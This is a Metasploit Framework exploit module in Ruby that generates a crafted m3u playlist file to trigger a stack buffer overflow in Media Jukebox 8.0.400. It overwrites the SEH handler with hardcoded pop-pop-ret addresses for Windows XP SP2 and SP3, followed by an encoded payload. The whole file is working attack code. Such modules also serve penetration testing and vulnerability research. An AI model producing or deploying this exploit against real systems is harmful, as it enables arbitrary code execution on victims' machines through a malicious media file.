##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
   include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name' => 'Media Jukebox 8.0.400 Buffer Overflow Exploit (SEH)',
			'Description' => %q{     
				This module exploits a stack overflow in Media Jukebox 8.0.400
			By creating a specially crafted m3u or pls file, an an attacker may be able
			to execute arbitrary code.
			},
			'License' => MSF_LICENSE,
			'Author' =>
				[
					'Ron Henry - <rlh [at] ciphermonk.net>',
					'dijital1',
				],
			'Version' => '$Revision: 7828 $',
			'References' =>
				[
					[ 'OSVDB', '' ],
					[ 'URL', 'http://www.exploit-db.com' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload' =>
				{
					'Space' => 3000,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x26\x3d\x2b\x3f\x3a\x3b\x2d\x2c\x2f\x23\x2e\x5c\x30",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets' =>
				[
					[ 'Windows XP SP3 - English', { 'Ret' => 0x02951457} ], 		# 0x02951457 pop, pop, ret dsp_mjMain.dll
					[ 'Windows XP SP2 - English', { 'Ret' => 0x02291457} ], 		# 0x02291457 pop, pop, ret dsp_mjMain.dll
				],
			'Privileged' => false,
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('FILENAME', [ false, 'The file name.', 'metasploit.m3u']),
			], self.class)
	end


	def exploit

      sploit = "\x68\x74\x74\x70\x3a\x2f\x2f" # "http://" trigger
		sploit << rand_text_alphanumeric(262) 
		sploit << generate_seh_payload(target.ret)
		sploit << payload.encoded

		print_status("Creating '#{datastore['FILENAME']}' file ...")
		file_create(sploit)

	end

end
